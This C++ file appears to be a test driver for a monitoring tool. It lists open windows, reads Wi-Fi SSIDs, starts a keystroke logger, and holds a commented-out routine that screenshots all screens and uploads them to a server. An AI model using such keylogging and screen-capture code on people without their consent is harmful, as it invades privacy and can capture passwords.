#include <ostream>

#include "windows_apps_info_manager/windows_apps_info_manager.hpp"
#include "screenshots_manager/screenshots_manager.hpp"
#include "network_manager/network_manager.hpp"
#include "keypresses_manager/key_presses_manager.hpp"

void get_windows_apps_info_TEST() {
    auto windows_manager = WindowsAppsInfoManager();
    for (const auto& window : windows_manager.get_windows_info()) {
        std::wcout << window << std::endl;
    }

    std::cout << std::endl << std::endl << "***********************************" << std::endl << std::endl << std::endl;
}

void take_screenshots_TEST() {
    /*ScreenshotsManager screenshots_manager("./images");
    auto screenshots_filepaths = screenshots_manager.take_screenshots_of_all_screens();
    std::cout << "Screenshots successfully made" << std::endl;

    screenshots_manager.upload_screenshots_to_server(screenshots_filepaths);
    std::cout << std::endl << std::endl << "***********************************" << std::endl << std::endl << std::endl;*/
}

void get_ssids_TEST() {
    NetworkManager network_manager;
    std::vector<std::string> SSIDs = network_manager.get_current_SSIDs();

    std::cout << "prining ssids: " << std::endl;
    for (auto&& curr_ssid : SSIDs) {
        std::cout << "- " << curr_ssid << std::endl;
    }
    std::cout << std::endl << std::endl << "***********************************" << std::endl << std::endl << std::endl;
}

void start_key_presses_logging_TEST() {
    std::string logging_file = "./";
    auto key_presses_manager = KeyPressesManager::create_manager_instance(std::cout);

    key_presses_manager->start();

    std::cout << "---------- IMPORTANT ---------- (start_key_presses_logging)" << std::endl;
    std::cout << "To turn the logging off, press log_off" << std::endl;
    std::cout << "(Logging is running on second thread so typing log_off and pressing enter this will stop that thread)" << std::endl;
    std::cout << "(to turn it on again, press log_on)" << std::endl;
    std::string input;
    while (std::cin >> input) {
        if (input == "log_off") {
            key_presses_manager->end();
        }
        if (input == "log_on") {
            key_presses_manager->start();
        }
    }
}

int main() {
    get_windows_apps_info_TEST();
    take_screenshots_TEST();
    get_ssids_TEST();

    start_key_presses_logging_TEST();

    
    
    return 0;
}
